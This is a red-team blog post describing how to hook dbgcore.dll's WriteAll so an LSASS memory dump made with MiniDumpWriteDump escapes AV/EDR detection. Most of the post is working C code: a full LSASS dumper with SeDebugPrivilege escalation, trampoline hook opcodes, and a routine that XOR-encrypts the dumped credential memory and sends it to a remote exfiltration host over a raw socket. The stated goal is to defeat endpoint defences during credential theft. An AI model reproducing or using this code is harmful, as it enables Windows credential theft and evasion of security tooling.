---
title: "Hooks-On Hoot-Off: Vitaminizing MiniDump"
date: 2021-02-09 17:00 +07:00
tags: [lsass, miniDumpWriteDump, hooking, credentials, research, Mario]
description: Article about how implement a memory hook to alter MiniDumpWriteDump 
---


Dear Fell**owl**ship, today's homily is about how we overcame an AV/EDR which, in spite of not being able to detect a `LSASS` memory dump process, it detected the signature of the dump-file and decided to mark it as malicious. So we decided to modify `MiniDumpWriteDump` behavior. Please, take a seat and listen to the story.


# Prayers at the foot of the Altar a.k.a. disclaimer

*As you may already know, `MiniDumpWriteDump` receives, among others, a handle to an already opened or created file. 
This is a PoC about how to overcome the limitation imposed by this function, which will take care of the whole __memory-read/write-buffer-to-file__ process.*

*It is recommended to perform this dance making use of API unhooking to make direct SYSCALLS to avoid AV/EDR hooks in place, as explained in the useful [Dumpert by Outflanknl](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/), or by any other evasion method. There are a lot of good resources explaining the topic, so we are not going to cover it here.*



# Introduction

During a Red Team assessment we came into a weird nuance were an AV/EDR, which we already thought bypassed, was erasing the dump file generated from the `LSASS` process memory. 

`miniDumpWriteDump`'s signature is as follows: 

```c
BOOL MiniDumpWriteDump(
  HANDLE                            hProcess,
  DWORD                             ProcessId,
  HANDLE                            hFile,
  MINIDUMP_TYPE                     DumpType,
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```

as per the [MSDN API documentation](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

Once the function is called, the file provided as the `hFile` parameter will be filled up with the memory of the LSASS process, as a `MDMP` format file. 

`MiniDumpWriteDump` takes care of all the magic comes-and-goes related to acquiring process memory and writing it to the provided file. So nice of it!

However, this kind of automated process lefts us with no control whatsoever over the memory buffer written to the file. 

We thought it might be nice to have a way to overcome such a limitation. 


# Digging dbgcore.dll internals

To inspect the inners, we'll be firing up WinDbg with a, rather simple, `LSASS` dumper implementation making use of the arch-known `MiniDumpWritedump`.
This implementation requires the `LSASS` process PID as parameter to run. Calling it, will provide a full memory dump saved to `c:\test.dmp`. Simple as that. This `.dmp`file can be processed with the usual tools. 


```c
#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")

void minidumpThis(HANDLE hProc)
{
 
    const wchar_t* filePath = L"C:\\test.dmp";
    HANDLE hFile = CreateFile(filePath, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (!hFile)
    {
        printf("No dump for you. Wrong file\n");
    } 
    else
    {
        DWORD lsassPid = GetProcessId(hProc);
        printf("Got PID:: %i\n", lsassPid);

        BOOL Result = MiniDumpWriteDump(hProc, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

        CloseHandle(hFile);

        if (!Result)
        {
            printf("No dump for you. Minidump failed\n");
        }
    }

    return;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    const wchar_t *lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("I dont have SeDebugPirvs\n");
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("Could not adjust to SeDebugPrivs\n");

        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

int main(int argc, char* args[])
{
    DWORD lsassPid = atoi(args[1]);
    HANDLE hProcess = NULL;
    if (!IsElevated()) {
        printf("not admin\n");
        return -1;
    }
    if (!SetDebugPrivilege()) {
        printf("no SeDebugPrivs\n");
        return -1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
    
    minidumpThis(hProcess);
    CloseHandle(hProcess);
 return 0;
}
```


Once compiled and debugged with WinDbg some breakpoints will be placed to aid us in the process: 

```c
bp miniDumpWriteDump    // Breakpoint at miniDumpWriteDump address
g                       // go (continue execution)
p                       // step-in
bp NtWriteFile          // Breakpoint at NtWriteFile
g                       // go (continue execution)
k                       // and, finally, print the backtrace 
```

Taking a look at the backtrace produced once the execution flow arrives to `NtWriteFile`, we can see how the last call inside `dbgcore.dll`,before letting the OS take care of the file-writing process, is made from a function called `WriteAll` laying inside the `Win32FileOutputProvider`. 

<figure>
<img src="/hookson-hootoff/WinDbg-backtrace.png" alt="WinDbg backtrace from NtWriteFile at MiniDumpWritedump"> 
<figcaption>
WinDbg backtrace.
</figcaption>
</figure>

However, this function is not publicly available to use, as the DLL won't export it. By inspecting the library, and its base address, we can easily determine the function offset, which seems to be `0xb4b0` (offset = abs_address - base_address)


By peeking a little bit more into the `WriteAll` function, we determined that the arguments passed to it were:

- arg1: File Handler
- arg2: Buffer (which is exactly what we intended to have from the beginning)
- arg3: Size


<figure>
<img src="/hookson-hootoff/dbgcore-WriteAll-dec.png" alt="dbgcore.dll!Win32FileOutputProvider::WriteAll disass"> 
<figcaption>
dbgcore.dll!Win32FileOutputProvider::WriteAll disassembly
</figcaption>
</figure>



Inspecting the memory at the direction given in [rdx] we can see the beginning of the dump file. 

<figure>
<img src="/hookson-hootoff/dbgcore-WriteAll-rdx.png" alt="dbgcore.dll!Win32FileOutputProvider::WriteAll buffer at rdx"> 
<figcaption>
dbgcore.dll!Win32FileOutputProvider::WriteAll Memory pointed by [rdx]
</figcaption>
</figure>


Therefore, it should be fairly straightforward to hook into this function to access the buffer and modify it as needed. 


# Call me ASMael

The idea of a _hook_ is to modify the "normal" execution flow of an application. Among others, function hooks are placed by many AV/EDR providers in order to monitor certain function calls to discover undesired behaviors. 

In this case, to detour the function execution, a direct memory write was implemented over the `WriteAll` address. This function was being called over and over during the dump process, likely to fragment the memory writes to smaller pieces and to retrieve different parts of the process being dumped, thus forcing us to restore the original bytes after every detoured call. 

Originally, it would look like this: 

<figure>
<img src="/hookson-hootoff/original-exec-flow.png" alt="Original execution flow schema"> 
<figcaption>
Original execution flow schema
</figcaption>
</figure>


Note that our primary intention here is not to re-implement the `WriteAll` function, but to modify the buffer, then restore the original overwritten bytes, and finally call `WriteAll` to let it do its job with the new buffer.
Simplest way to achieve it would be by making the execution flow jump as soon as it reaches `WriteAll`:

```asm
mov r10, <__TRAMPOLINE_ADDRESS>
jmp r10
```


<figure>
<img src="/hookson-hootoff/modified-exec-flow.png" alt="Modified execution flow schema"> 
<figcaption>
Modified execution flow schema
</figcaption>
</figure>


That assembly lines translate to the following opcodes to be written at the beginning of the `WriteAll` function:

```c
uint8_t trampoline_assembly[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov r10, NEW_LOC_@ddress
    0x41, 0xFF, 0xE2        // jmp r10
};
```

Where all those 0x00 should be replaced by the `_trampoline` function address.


Which translates to something as simple as: 

```c
 const char* dbgcore_name = "dbgcore.dll";
 intptr_t dbgcore_handle = (intptr_t)LoadLibraryA(dbgcore_name);

 intptr_t writeAll_offset = 0xb4b0;
 writeAll_abs = dbgcore_handle + writeAll_offset;

 void* _hoot_trampoline_address = (void*)_hoot_trampoline;
 memcpy(&trampoline_assembly[2], &_hoot_trampoline_address, sizeof(_hoot_trampoline_address));
```


# Jumping into the trampoline

As stated before, the `_trampoline` should implement the following logic:
    
    - Perform the required buffer operations (such as encryption or exfiltration)
    - Restore the original overwritten bytes from `WriteAll`.
    - Call the original `WriteAll` function with the modified buffer.
    - Write the hook again in the `WriteAll` function. 



```c
UINT32 _hoot_trampoline(HANDLE file_handler, void* buffer, INT64 size) {
    
    // The position calculation lines will make sense in the Prowlblems section ^o^
    long high_dword = NULL;
    DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
    long pos = high_dword << 32 | low_dword;

    unsigned char *new_buff = hoot(buffer, size, pos);  // Perform buffer operations: Encrypt, nuke, send it...

    // Overwrite the WriteAll initial bytes to perform a direct jmp to our _trampoline_function
    WriteProcessMemory(hProcess,
         (LPVOID*)writeAll_abs,
         &overwritten_writeAll,
         sizeof(overwritten_writeAll),
         NULL
    );      // Restore original bytes

    /* Call the WriteAll absolute address (cast it to a function that
    returns an UINT32 and 
    receives a HANDLE, a pointer to a buffer and an INT64)
    */
    UINT32 ret = ( (UINT32(*)(HANDLE, void*, INT64) ) (writeAll_abs) ) (file_handler, (void*)new_buff, size);      // erg...
    
    // Rewrite the hook at the beginning of the WriteAll
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    return ret;
}
```


The `hoot` function may implement a variety of modifications or operations over the passed buffer. In this PoC we're just XORing the contents of the buffer with a single byte, and sending it via socket connection to a receiving server. It also provides a simple in-memory buffer nuke to avoid writing any contents of the actual buffer to disk.

This proved to be more than enough to prevent any AV/EDR solution from removing the dump file from the computer. 


```c
unsigned char* hoot(void* buffer, INT64 size, long pos) {
    unsigned char* new_buff = (unsigned char*) buffer;

    if (USE_ENCRYPTION) {
        new_buff = encrypt(buffer, size, XOR_KEY);
    }
  
    if (EXFIL) {
        s = getRawSocket(EXFIL_HOST, EXFIL_PORT);
        if(s) {
            sendBytesRaw(s, (const char*)new_buff, size, pos);
        }
        else {
            printf("[!] ERR:: SOCKET NOT READY\n");
         }
    }

    if (!WRITE_TO_FILE) {
        memset(new_buff, 0x00, size);
    }
   
    return new_buff;
}
```


# Pr*owl*blems


Once the exfiltration/encryption tasks were coded and we started testing, we realized that the `WriteAll` function was not creating the dump in a sequential manner. It was actually making `NtWriteFile` jump all over the file writing bytes here and there by setting an offset to write to.

```c
__kernel_entry NTSYSCALLAPI NTSTATUS NtWriteFile(
  HANDLE           FileHandle,
  HANDLE           Event,
  PIO_APC_ROUTINE  ApcRoutine,
  PVOID            ApcContext,
  PIO_STATUS_BLOCK IoStatusBlock,
  PVOID            Buffer,
  ULONG            Length,
  PLARGE_INTEGER   ByteOffset,      // Right here O^O
  PULONG           Key
);
```



After having a nice talk with [@TheXC3LL](https://twitter.com/TheXC3LL), he found this little nifty trick to find out where the _cursor_ was in the file handler received in our `_trampoline` function: [Get current cursor location on a file pointer](https://stackoverflow.com/a/8945539)


```c
long high_dword = NULL;
DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
long pos = high_dword << 32 | low_dword;
```

Once obtained, we could easily tell our receiving server where in the file it should place the received buffer, by sending a buffer composed of the offset, the size of the modified buffer, and the modified buffer itself. Creating a simple protocol as:

```
   4B     4B       <SIZE>B  
<OFFSET><SIZE><BUFFFFFFFFFFFER>
```

<figure>
<img src="/hookson-hootoff/exfiltration-success.png" alt="Buffer exfiltrations succeded"> 
<figcaption>
Dump reconstruction from received buffer
</figcaption>
</figure>


# Related projects


[SharpMiniDump with NTFS transactions](https://github.com/PorLaCola25/TransactedSharpMiniDump) by [PorLaCola25](https://github.com/PorLaCola25) based on [b4rtik's SharpMiniDump](https://github.com/b4rtik/SharpMiniDump)

[Lsass Minidump file seen as Malicious by McAfee AV](https://www.bussink.net/lsass-minidump-file-seen-as-malicious-by-mcafee-av/) by [K4nfr3](https://twitter.com/k4nfr3)



# EoF

Although this wasn't an incredible discovery, playing with memory is always fun ^o^
Also, if you made it to the end of this article, you might want the full code of this PoC. Available as usual [in our GitHub, Adepts-Of-0xCC](https://github.com/Adepts-Of-0xCC/MiniDumpWriteDumpPoC)

Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).



